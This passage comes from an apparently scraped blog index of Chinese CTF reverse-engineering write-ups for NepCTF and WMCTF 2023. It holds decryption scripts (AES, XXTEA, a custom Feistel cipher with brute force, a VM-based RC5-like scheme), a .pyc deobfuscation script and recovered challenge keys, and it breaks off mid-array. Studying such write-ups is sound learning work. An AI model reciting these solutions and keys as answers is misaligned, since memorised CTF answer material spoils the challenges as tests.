b\"\\xF4\\x9C\\xDD\\x41\\x03\\xDD\\x5A\\x13\\x2E\\x55\\x97\\x9E\\xFF\\xD5\\x08\\xD9\\xF6\\xD1\\x09\\x8C\\x68\\x9E\\x92\\xFF\\x75\\x0F\\x80\\x95\\x4B\\x16\\xB9\\xC6\\x7F\\x54\\x2E\\x20\\x35\\xFC\\x1B\\x46\\x14\\xAA\\xDA\\x5E\\x4F\\xBD\\x59\\x71\"aes = AES.new(password, AES.MODE_ECB)den_text = aes.decrypt(text)for z in range(0, len(den_text), 4): tmp = 0xffffffff-int.from_bytes(den_text[z : z + 4], byteorder=\"little\") print(tmp, end=\", \") 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#define DELTA 0x9e3779b9#define MX \\ (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ \\ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z; uint32_t sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) { y = v[p + 1]; z = v[p] += MX; } y = v[0]; z = v[n - 1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) { z = v[p - 1]; y = v[p] -= MX; } z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); }}int main() { uint32_t v[12] = {2309579534, 3094518205, 2274467788, 4072683167, 418971191, 2065596768, 236488259, 3759075494, 2770389782, 2907179657, 384852496, 1019579761}; uint32_t const k[4] = {0x00000019, 0x00000000, 0x0000006E, 0x00000003}; int n = 12; btea(v, -n, k); uint8_t *tmp = (uint8_t *)v; for (int i = 0; i &lt; 48; i++) { printf(\"%c\", tmp[i]); } return 0;} eeeeerte易语言，逆起来很恶心，用IDA插件恢复了部分函数名，图片点击根据总次数共有三种响应，一种是正常的加密逻辑，输入是key，不过加密的是假flag。第二种是弹窗输出真flag加密后的结果。第三个是画图。 因为key和flag都没有，猜测第三个画出来的是key，但是我在linux下用wine跑弹不出画板，不知道会不会真的弹出来图，所以用python按照给出的左上角和右下角的坐标画了一个，得到key是NITORI2413，然后按照加密的过程一点点逆就可以了。 不过结果是47位，不能被8整除，最后一位填充什么未知，懒得逆所以直接爆破。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;ctype.h&gt;#include &lt;iostream&gt;unsigned char R[256] = { 0xA3, 0xD7, 0x09, 0x83, 0xF8, 0x48, 0xF6, 0xF4, 0xB3, 0x21, 0x15, 0x78, 0x99, 0xB1, 0xAF, 0xF9, 0xE7, 0x2D, 0x4D, 0x8A, 0xCE, 0x4C, 0xCA, 0x2E, 0x52, 0x95, 0xD9, 0x1E, 0x4E, 0x38, 0x44, 0x28, 0x0A, 0xDF, 0x02, 0xA0, 0x17, 0xF1, 0x60, 0x68, 0x12, 0xB7, 0x7A, 0xC3, 0xE9, 0xFA, 0x3D, 0x53, 0x96, 0x84, 0x6B, 0xBA, 0xF2, 0x63, 0x9A, 0x19, 0x7C, 0xAE, 0xE5, 0xF5, 0xF7, 0x16, 0x6A, 0xA2, 0x39, 0xB6, 0x7B, 0x0F, 0xC1, 0x93, 0x81, 0x1B, 0xEE, 0xB4, 0x1A, 0xEA, 0xD0, 0x91, 0x2F, 0xB8, 0x55, 0xB9, 0xDA, 0x85, 0x3F, 0x41, 0xBF, 0xE0, 0x5A, 0x58, 0x80, 0x5F, 0x66, 0x0B, 0xD8, 0x90, 0x35, 0xD5, 0xC0, 0xA7, 0x33, 0x06, 0x65, 0x69, 0x45, 0x00, 0x94, 0x56, 0x6D, 0x98, 0x9B, 0x76, 0x97, 0xFC, 0xB2, 0xC2, 0xB0, 0xFE, 0xDB, 0x20, 0xE1, 0xEB, 0xD6, 0xE4, 0xDD, 0x47, 0x4A, 0x1D, 0x42, 0xED, 0x9E, 0x6E, 0x49, 0x3C, 0xCD, 0x43, 0x27, 0xD2, 0x07, 0xD4, 0xDE, 0xC7, 0x67, 0x18, 0x89, 0xCB, 0x30, 0x1F, 0x8D, 0xC6, 0x8F, 0xAA, 0xC8, 0x74, 0xDC, 0xC9, 0x5D, 0x5C, 0x31, 0xA4, 0x70, 0x88, 0x61, 0x2C, 0x9F, 0x0D, 0x2B, 0x87, 0x50, 0x82, 0x54, 0x64, 0x26, 0x7D, 0x03, 0x40, 0x34, 0x4B, 0x1C, 0x73, 0xD1, 0xC4, 0xFD, 0x3B, 0xCC, 0xFB, 0x7F, 0xAB, 0xE6, 0x3E, 0x5B, 0xA5, 0xAD, 0x04, 0x23, 0x9C, 0x14, 0x51, 0x22, 0xF0, 0x29, 0x79, 0x71, 0x7E, 0xFF, 0x8C, 0x0E, 0xE2, 0x0C, 0xEF, 0xBC, 0x72, 0x75, 0x6F, 0x37, 0xA1, 0xEC, 0xD3, 0x8E, 0x62, 0x8B, 0x86, 0x10, 0xE8, 0x08, 0x77, 0x11, 0xBE, 0x92, 0x4F, 0x24, 0xC5, 0x32, 0x36, 0x9D, 0xCF, 0xF3, 0xA6, 0xBB, 0xAC, 0x5E, 0x6C, 0xA9, 0x13, 0x57, 0x25, 0xB5, 0xE3, 0xBD, 0xA8, 0x3A, 0x01, 0x05, 0x59, 0x2A, 0x46,};char key[] = \"NITORI2413\";void enc(unsigned char *buffer) { for (int i = 0; i &lt; 32; i++) { for (int j = 0; j &lt; 8; j++) { printf(\"%02x \", buffer[j]); } printf(\"\\n\"); if ((i / 8) % 2 == 0) { unsigned char a0 = buffer[0]; unsigned char a1 = buffer[1]; a0 ^= R[a1 ^ key[(4 * i) % 10]]; a1 ^= R[a0 ^ key[(4 * i + 1) % 10]]; a0 ^= R[a1 ^ key[(4 * i + 2) % 10]]; a1 ^= R[a0 ^ key[(4 * i + 3) % 10]]; // auto tmp = (unsigned short *)buffer; unsigned short tmp[4]; for (int j = 0; j &lt; 4; j++) tmp[j] = (buffer[2 * j] &lt;&lt; 8) | buffer[2 * j + 1]; tmp[0] = tmp[3] ^ (i + 1); tmp[3] = tmp[2]; tmp[2] = tmp[1]; tmp[1] = (a0 &lt;&lt; 8) | a1; tmp[0] ^= tmp[1]; for (int j = 0; j &lt; 4; j++) { buffer[2 * j] = (tmp[j] &gt;&gt; 8) &amp; 0xff; buffer[2 * j + 1] = (tmp[j]) &amp; 0xff; } } else { unsigned short tmp[4]; for (int j = 0; j &lt; 4; j++) tmp[j] = (buffer[2 * j] &lt;&lt; 8) | buffer[2 * j + 1]; auto s_tmp = tmp[0]; tmp[0] = tmp[3]; tmp[3] = tmp[2]; tmp[2] = (tmp[1] ^ s_tmp) ^ (i + 1); unsigned char a0 = buffer[0]; unsigned char a1 = buffer[1]; a0 ^= R[a1 ^ key[(4 * i) % 10]]; a1 ^= R[a0 ^ key[(4 * i + 1) % 10]]; a0 ^= R[a1 ^ key[(4 * i + 2) % 10]]; a1 ^= R[a0 ^ key[(4 * i + 3) % 10]]; tmp[1] = (a0 &lt;&lt; 8) | a1; for (int j = 0; j &lt; 4; j++) { buffer[2 * j] = (tmp[j] &gt;&gt; 8) &amp; 0xff; buffer[2 * j + 1] = (tmp[j]) &amp; 0xff; } } }}void dec(unsigned char *buffer) { for (int i = 31; i &gt;= 0; i--) { if ((i / 8) % 2 == 0) { unsigned short tmp[4]; for (int j = 0; j &lt; 4; j++) tmp[j] = (buffer[2 * j] &lt;&lt; 8) | buffer[2 * j + 1]; tmp[0] ^= tmp[1]; unsigned char a0 = (tmp[1] &gt;&gt; 8) &amp; 0xff; unsigned char a1 = (tmp[1]) &amp; 0xff; tmp[1] = tmp[2]; tmp[2] = tmp[3]; tmp[3] = tmp[0] ^ (i + 1); for (int j = 0; j &lt; 4; j++) { buffer[2 * j] = (tmp[j] &gt;&gt; 8) &amp; 0xff; buffer[2 * j + 1] = (tmp[j]) &amp; 0xff; } a1 ^= R[a0 ^ key[(4 * i + 3) % 10]]; a0 ^= R[a1 ^ key[(4 * i + 2) % 10]]; a1 ^= R[a0 ^ key[(4 * i + 1) % 10]]; a0 ^= R[a1 ^ key[(4 * i) % 10]]; buffer[0] = a0; buffer[1] = a1; } else { unsigned short tmp[4]; for (int j = 0; j &lt; 4; j++) tmp[j] = (buffer[2 * j] &lt;&lt; 8) | buffer[2 * j + 1]; unsigned char a0 = (tmp[1] &gt;&gt; 8) &amp; 0xff; unsigned char a1 = (tmp[1]) &amp; 0xff; a1 ^= R[a0 ^ key[(4 * i + 3) % 10]]; a0 ^= R[a1 ^ key[(4 * i + 2) % 10]]; a1 ^= R[a0 ^ key[(4 * i + 1) % 10]]; a0 ^= R[a1 ^ key[(4 * i) % 10]]; buffer[0] = a0; buffer[1] = a1; unsigned short s_tmp = (a0 &lt;&lt; 8) | a1; tmp[1] = (tmp[2] ^ (i + 1)) ^ s_tmp; tmp[2] = tmp[3]; tmp[3] = tmp[0]; for (int j = 1; j &lt; 4; j++) { buffer[2 * j] = (tmp[j] &gt;&gt; 8) &amp; 0xff; buffer[2 * j + 1] = (tmp[j]) &amp; 0xff; } } }}int main() { // unsigned char plain[] = \"flag{Misdirection?MysteriousJack?FAAAKE}\"; // for (int i = 0; i &lt; 40; i += 8) // enc(&amp;plain[i]); // for (int i = 0; i &lt; 40; i++) { // printf(\"%02x \", plain[i]); // } // printf(\"\\n\"); for (int c = 0; c &lt;= 0xff; c++) { unsigned char cipher[49] = { 0xc6, 0x6c, 0x4e, 0xf7, 0x74, 0xa7, 0xf1, 0x88, 0xdf, 0xa1, 0x6a, 0x9a, 0x15, 0x2e, 0xa9, 0xa0, 0xb7, 0xfa, 0x9f, 0x5a, 0xbb, 0x6d, 0x6a, 0xc8, 0xc9, 0x76, 0xcb, 0x1, 0xd7, 0x12, 0x8f, 0x28, 0x16, 0x7e, 0xcf, 0xe3, 0x1, 0x57, 0x38, 0x95, 0xe1, 0x6b, 0x4c, 0x36, 0x58, 0x74, 0x5a, 0x00, 0x00}; for (int i = 0; i &lt; 40; i += 8) dec(&amp;cipher[i]); cipher[47] = c; for (int i = 40; i &lt; 48; i += 8) dec(&amp;cipher[i]); printf(\"%d %s\\n\", c, cipher); }}","link":"/2023/08/14/nepctf-2023/"},{"title":"wmctf-2023","text":"只做了一天，有很多新东西，后面慢慢复现 rerightback去花 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178import marshalimport disimport structimport timeimport typesimport binasciidef print_metadata(fp): magic = struct.unpack('&lt;l', fp.read(4))[0] print(f\"magic number = {hex(magic)}\") bit_field = struct.unpack('&lt;l', fp.read(4))[0] print(f\"bit filed = {bit_field}\") t = struct.unpack('&lt;l', fp.read(4))[0] print(f\"time = {time.asctime(time.localtime(t))}\") file_size = struct.unpack('&lt;l', fp.read(4))[0] print(f\"file size = {file_size}\")def show_code(code, indent=''): print(\"%scode\" % indent) indent += ' ' print(\"%sargcount %d\" % (indent, code.co_argcount)) print(\"%snlocals %d\" % (indent, code.co_nlocals)) print(\"%sstacksize %d\" % (indent, code.co_stacksize)) print(\"%sflags %04x\" % (indent, code.co_flags)) show_hex(\"code\", code.co_code, indent=indent) co = bytearray(code.co_code) extended_arg = 0 for i in range(0, len(co), 2): op = co[i] if op &gt;= 90: arg = co[i+1] | extended_arg extended_arg = (arg &lt;&lt; 8) if op == 114 else 0 if co[i] == 110: # print(\"=========&gt; \", co[i+1]) if arg &lt; 5: for j in range(i, i+arg+2): co[j] = 9 else: arg = None extended_arg = 0 mode = types.CodeType(code.co_argcount, code.co_posonlyargcount, code.co_kwonlyargcount, code.co_nlocals, code.co_stacksize, code.co_flags, bytes(co), tuple(code.co_consts), code.co_names, code.co_varnames, code.co_filename, code.co_name, code.co_firstlineno, code.co_lnotab, code.co_freevars, code.co_cellvars) dis.disassemble(mode) # print(\"=====\") # dis.disassemble(code) print(\"%sconsts\" % indent) for const in code.co_consts: if type(const) == types.CodeType: show_code(const, indent+' ') else: print(\" %s%r\" % (indent, const)) print(\"%snames %r\" % (indent, code.co_names)) print(\"%svarnames %r\" % (indent, code.co_varnames)) print(\"%sfreevars %r\" % (indent, code.co_freevars)) print(\"%scellvars %r\" % (indent, code.co_cellvars)) print(\"%sfilename %r\" % (indent, code.co_filename)) print(\"%sname %r\" % (indent, code.co_name)) print(\"%sfirstlineno %d\" % (indent, code.co_firstlineno)) show_hex(\"lnotab\", code.co_lnotab, indent=indent)def show_hex(label, h, indent): h = binascii.hexlify(h) if len(h) &lt; 60: print(\"%s%s %s\" % (indent, label, h)) else: print(\"%s%s\" % (indent, label)) for i in range(0, len(h), 60): print(\"%s %s\" % (indent, h[i:i+60]))def de(code): co = bytearray(code.co_code) extended_arg = 0 for i in range(0, len(co), 2): op = co[i] if op &gt;= 90: arg = co[i+1] | extended_arg extended_arg = (arg &lt;&lt; 8) if op == 114 else 0 if co[i] == 110: # print(\"=========&gt; \", co[i+1]) if arg &lt; 10: for j in range(i, i+arg+2): co[j] = 9 else: arg = None extended_arg = 0 # mode=types.CodeType(code.co_argcount,code.co_posonlyargcount, # code.co_kwonlyargcount, # code.co_nlocals, # code.co_stacksize, # code.co_flags, # bytes(co), # tuple(code.co_consts), # code.co_names, # code.co_varnames, # code.co_filename, # code.co_name, # code.co_firstlineno, # code.co_lnotab, # code.co_freevars, # code.co_cellvars) # dis.disassemble(mode) return bytes(co)if __name__ == '__main__': filename = \"./RightBack.pyc\" with open(filename, 'rb') as f: header = f.read(16) code = marshal.load(f) consts = list() for i in range(len(code.co_consts)): if hasattr(code.co_consts[i], 'co_code'): if code.co_name=='VM': continue consts.append(types.CodeType(code.co_consts[i].co_argcount, code.co_posonlyargcount, code.co_kwonlyargcount, code.co_consts[i].co_nlocals, code.co_consts[i].co_stacksize, code.co_consts[i].co_flags, de(code.co_consts[i]), code.co_consts[i].co_consts, code.co_consts[i].co_names, code.co_consts[i].co_varnames, code.co_consts[i].co_filename, code.co_consts[i].co_name, code.co_consts[i].co_firstlineno, # In general, You should adjust this code.co_consts[i].co_lnotab, code.co_consts[i].co_freevars, code.co_consts[i].co_cellvars)) else: consts.append(code.co_consts[i]) mode = types.CodeType(code.co_argcount, code.co_posonlyargcount, code.co_kwonlyargcount, code.co_nlocals, code.co_stacksize, code.co_flags, de(code), tuple(consts), code.co_names, code.co_varnames, code.co_filename, code.co_name, code.co_firstlineno, code.co_lnotab, # In general, You should adjust this code.co_freevars, code.co_cellvars) f = open(filename+\".mod\", 'wb') f.write(header) marshal.dump(mode, f) # with open(filename, \"rb\") as fp: # print_metadata(fp) # code_object = marshal.load(fp) # show_code(code_object) 用pycdc可以得到py文件，稍微修正以后输出执行指令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859# Source Generated with Decompyle++# File: RightBack.pyc.mod (Python 3.9)import structdef T(num, round): numArr = bytearray(struct.pack('&lt;I', num)) for i in range(4): numArr[i] = Sbox[numArr[i]] return struct.unpack('&lt;I', numArr)[0] ^ Rcon[round]def p1(s, key): j = 0 k = [] for i in range(256): s.append(i) k.append(key[i % len(key)]) for i in range(256): j = (j + s[i] + ord(k[i])) % 256 s[i], s[j] = s[j], s[i]def p2(key): w = [ 0] * 44 for i in range(4): w[i] = struct.unpack('&lt;I', key[i * 4:i * 4 + 4])[0] cnt = 0 for i in range(4, 44, 1): if i % 4 == 0: w[i] = w[i - 4] ^ T(w[i - 1], cnt) cnt += 1 else: w[i] = w[i - 4] ^ w[i - 1] return wdef p3(s, p): i = j = 0 for z in range(len(p)): i = (i + 1) % 256 j = (j + s[i]) % 256 s[i], s[j] = s[j], s[i] p[z] ^= s[(s[i] + s[j]) % 256] return pdef F1(part1, part2): global REG REG = { 'EAX': 0, 'EBX': 0, 'ECX': 0, 'EDX': 0, 'R8': 0, 'CNT': 0, 'EIP': 0} REG['EAX'] = part1 REG['EBX'] = part2def F2(v1, v2, v3): if v1 == 1: print(f\"{reg_table[str(v2)]} = extendKey[{reg_table[str(v3)]}]\") REG[reg_table[str(v2)]] = extendKey[REG[reg_table[str(v3)]]] elif v1 == 2: print(f\"{reg_table[str(v2)]} = {reg_table[str(v3)]}\") REG[reg_table[str(v2)]] = REG[reg_table[str(v3)]] elif v1 == 3: print(f\"{reg_table[str(v2)]} = {v3}\") REG[reg_table[str(v2)]] = v3 REG['EIP'] += 4def F3(v1, v2, v3): if v1 == 1: print( f\"{reg_table[str(v2)]} = {reg_table[str(v2)]} + extendKey[{reg_table[str(v3)]}] &amp; 0xFFFFFFFF\") REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + \\ extendKey[REG[reg_table[str(v3)]]] &amp; 0xFFFFFFFF elif v1 == 2: print( f\"{reg_table[str(v2)]} = {reg_table[str(v2)]} + {reg_table[str(v3)]} &amp; 0xFFFFFFFF\") REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + \\ REG[reg_table[str(v3)]] &amp; 0xFFFFFFFF elif v1 == 3: print( f\"{reg_table[str(v2)]} = {reg_table[str(v2)]} + {v3} &amp; 0xFFFFFFFF\") REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + v3 &amp; 0xFFFFFFFF REG['EIP'] += 4def F4(v1, v2): print(f\"{reg_table[str(v1)]} ^= {reg_table[str(v2)]}\") REG[reg_table[str(v1)]] ^= REG[reg_table[str(v2)]] REG['EIP'] += 3def F5(v1, v2): print(f\"{reg_table[str(v1)]} &amp;= {v2}\") REG[reg_table[str(v1)]] &amp;= v2 REG['EIP'] += 3def F6(v1, v2, v3): if v1 == 1: print(f\"{reg_table[str(v2)]} -= extendKey[{v3}]\") REG[reg_table[str(v2)]] -= extendKey[v3] elif v1 == 2: print(f\"{reg_table[str(v2)]} -= {reg_table[str(v3)]}\") REG[reg_table[str(v2)]] -= REG[reg_table[str(v3)]] elif v1 == 3: print(f\"{reg_table[str(v2)]} -= {v3}\") REG[reg_table[str(v2)]] -= v3 REG['EIP'] += 4def F7(v1, v2): print(f\"{reg_table[str(v1)]} |= {reg_table[str(v2)]}\") REG[reg_table[str(v1)]] |= REG[reg_table[str(v2)]] REG['EIP'] += 3def F8(v1, v2): print( f\"{reg_table[str(v1)]} = {reg_table[str(v1)]} &gt;&gt; {reg_table[str(v2)]} &amp; 0xFFFFFFFF\") REG[reg_table[str(v1)]] = REG[reg_table[str(v1)] ] &gt;&gt; REG[reg_table[str(v2)]] &amp; 0xFFFFFFFF REG['EIP'] += 3def F9(v1, v2): print( f\"{reg_table[str(v1)]} = {reg_table[str(v1)]} &lt;&lt; {reg_table[str(v2)]} &amp; 0xFFFFFFFF\") REG[reg_table[str(v1)]] = REG[reg_table[str(v1)] ] &lt;&lt; REG[reg_table[str(v2)]] &amp; 0xFFFFFFFF REG['EIP'] += 3def FA(v1, v2, v3): if v1 == 1: print(f\"{reg_table[str(v2)]} *= extendKey[{v3}]\") REG[reg_table[str(v2)]] *= extendKey[v3] elif v1 == 2: print(f\"{reg_table[str(v2)]} *= {reg_table[str(v3)]}\") REG[reg_table[str(v2)]] *= REG[reg_table[str(v3)]] elif v1 == 3: print(f\"{reg_table[str(v2)]} *= {v3}\") REG[reg_table[str(v2)]] *= v3 REG['EIP'] += 4def FB(): print(\"R8 = CNT == 21\") REG['R8'] = REG['CNT'] == 21 REG['EIP'] += 1def WC(): print(\"if R8 != 0: break\") if not REG['R8']: REG['EIP'] = 16 else: REG['EIP'] += 1def VM(part1, part2): F1(part1, part2) while 1: EIP = REG['EIP'] if opcode[EIP] == 80: # print( # f\"F2({opcode[EIP + 1]}, {opcode[EIP + 2]}, {opcode[EIP + 3]})\") F2(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3]) continue if opcode[EIP] == 29: # print( # f\"F3({opcode[EIP + 1]}, {opcode[EIP + 2]}, {opcode[EIP + 3]})\") F3(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3]) continue if opcode[EIP] == 113: # print(f\"F4({opcode[EIP + 1]}, {opcode[EIP + 2]})\") F4(opcode[EIP + 1], opcode[EIP + 2]) continue if opcode[EIP] == 114: # print(f\"F5({opcode[EIP + 1]}, {opcode[EIP + 2]})\") F5(opcode[EIP + 1], opcode[EIP + 2]) continue if opcode[EIP] == 150: # print( # f\"F6({opcode[EIP + 1]}, {opcode[EIP + 2]}, {opcode[EIP + 3]})\") F6(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3]) continue if opcode[EIP] == 87: # print(f\"F7({opcode[EIP + 1]}, {opcode[EIP + 2]})\") F7(opcode[EIP + 1], opcode[EIP + 2]) continue if opcode[EIP] == 116: # print(f\"F8({opcode[EIP + 1]}, {opcode[EIP + 2]})\") F8(opcode[EIP + 1], opcode[EIP + 2]) continue if opcode[EIP] == 41: # print(f\"F9({opcode[EIP + 1]}, {opcode[EIP + 2]})\") F9(opcode[EIP + 1], opcode[EIP + 2]) continue if opcode[EIP] == 220: # print( # f\"FA({opcode[EIP + 1]}, {opcode[EIP + 2]}, {opcode[EIP + 3]})\") FA(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3]) continue if opcode[EIP] == 7: # print(\"FB()\") FB() continue if opcode[EIP] == 153: # print(\"WC()\") WC() continue breakdef Have(): Hello = ' \\n|| / | / / \\n|| / | / / ___ // ___ ___ _ __ ___ __ ___ ___ \\n|| / /||/ / //___) ) // // ) ) // ) ) // ) ) ) ) //___) ) / / // ) ) \\n||/ / | / // // // // / / // / / / / // / / // / / \\n| / | / ((____ // ((____ ((___/ / // / / / / ((____ / / ((___/ / \\n \\n \\n|| / | / / /| //| | // ) ) /__ ___/ // / / ___ ___ ___ ___ \\n|| / | / / //| // | | // / / //___ // ) ) // ) ) // ) ) // ) ) \\n|| / /||/ / // | // | | // / / / ___ ___/ / // / / ___/ / __ / / \\n||/ / | / // | // | | // / / // / ____/ // / / / ____/ ) ) \\n| / | / // |// | | ((____/ / / / // / /____ ((___/ / / /____ ((___/ / \\n ' print(Hello) # return input('RightBack: ').encode() return b\"abcd\"*16def Fun(right): if len(right) != 64: print('XD') exit() back = b'' for i in range(0, len(right), 8): print(\"=============\") part1 = struct.unpack('&gt;I', right[i + 0:i + 4])[0] part2 = struct.unpack('&gt;I', right[i + 4:i + 8])[0] if i != 0: part1 ^= struct.unpack('&gt;I', back[i - 8:i - 4])[0] part2 ^= struct.unpack('&gt;I', back[i - 4:i])[0] VM(part1, part2) back += struct.pack('&gt;I', REG['EAX']) back += struct.pack('&gt;I', REG['EBX']) return backif __name__ == '__main__': REG = {} EIP = 0 reg_table = { '1': 'EAX', '2': 'EBX', '3': 'ECX', '4': 'EDX', '5': 'R8', '6': 'CNT', '7': 'EIP'} Sbox = [ 82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, 250, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, 200, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125] Rcon = [ 16777216, 33554432, 67108864, 134217728, 268435456, 536870912, 1073741824, 0x80000000, 452984832, 905969664] s = [] key = 'CalmDownBelieveU' p1(s, key) key = [ 61, 15, 58, 65, 177, 180, 182, 248, 192, 143, 37, 238, 50, 29, 215, 190] key = bytes(p3(s, key)) print(key) extendKey = p2(bytes(key)) opcode = [ 69, 136, 121, 24, 179, 67, 209, 20, 27, 169, 205, 146, 212, 160, 124, 49, 20, 155, 157, 253, 52, 71, 174, 164, 134, 60, 184, 203, 131, 210, 57, 151, 77, 241, 61, 6, 13, 52, 235, 37, 100, 178, 8, 238, 205, 27, 194, 159, 230, 165, 211, 221, 100, 217, 111, 202, 185, 207, 226, 50, 88, 4, 58, 73, 10, 92, 24, 230, 246, 245, 21, 110, 182, 151, 85, 28, 181, 191, 185, 236, 92, 98, 222, 85, 228, 14, 235, 93, 77, 161, 61, 140, 222, 74, 124, 13, 211, 75, 134, 235, 164, 228, 235, 16, 29, 41, 49, 105, 188, 51, 232, 65, 209, 165, 35, 182, 248, 245, 69, 18, 152, 71, 223, 85, 114] opcode = p3(s, opcode) # print(opcode) right = Have() back = Fun(right) data1 = [ 228, 244, 207, 251, 194, 124, 252, 61, 198, 145, 97, 98, 89, 25, 92, 208, 155, 38, 34, 225, 98, 206, 234, 245, 223, 54, 214, 137, 35, 86, 180, 66, 223, 234, 90, 136, 5, 189, 166, 117, 111, 222, 39, 156, 163, 173, 36, 174, 47, 144, 15, 160, 45, 239, 211, 11, 190, 181, 24, 164, 234, 114, 174, 27] data1 = bytes(p3(s, data1)) data2 = [ 165, 83, 203, 51, 99, 164, 30, 91, 230, 64, 181, 55, 190, 47, 125, 240, 186, 173, 116, 47, 89, 64, 68, 215, 124, 138, 34, 175, 60, 136, 77, 216, 250, 127, 14, 14, 66, 168, 198, 247, 252, 189, 243, 239, 25, 63, 143, 7, 177, 13, 99, 226, 100, 6, 207, 77, 46, 136, 251, 123, 225, 27, 76, 183] data2 = bytes(p3(s, data2)) print(data2) print(extendKey) data3 = [ 95, 219, 46, 178, 111, 141, 17, 168, 254, 60, 68, 59, 41, 183, 182, 118, 3, 47, 150, 240, 140, 159, 110, 238] data3 = bytes(p3(s, data3)) print(back) if back == data2: print(bytes(data1).decode()) else: print(bytes(data3).decode()) 做的时候不知道是rc5，直接对着写了一个加解密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455res = b'\\x04:\\xf26V\\xb1\\x9a\\xfc\\xf7\\x1e!\\xdc\\xdb\\x8f\\x8e\\x94M4\\xe7\\x9d\\x9cR\\x0cn\\xfb\\xfa\\xd5\\xfd2\\xf9x,\\xbb\\xbe9\\xc1\\xd9\\x85u\\xb6(\\xf8\\xccx\\xa4\\xe4\\x85\\x92\\x0e\\xbdr\\xc5\\xaf\\x87\\x91*\\x8b\\xf1\\xef\\x96\\x16`\\xd1\\x12'ek = [1835819331, 1853321028, 1768711490, 1432712805, 2177920767, 4020699579, 2261476601, 3551400604, 711874531, 3318306392, 1124217505, 2427199549, 3099853672, 2098025776, 1041196945, 2929936300, 246748610, 1941455090, 1303848803, 3809763535, 1395557789, 546751855, 1830937100, 2385871555, 2516030638, 3043054017, 3628118989, 1450520846, 1825094265, 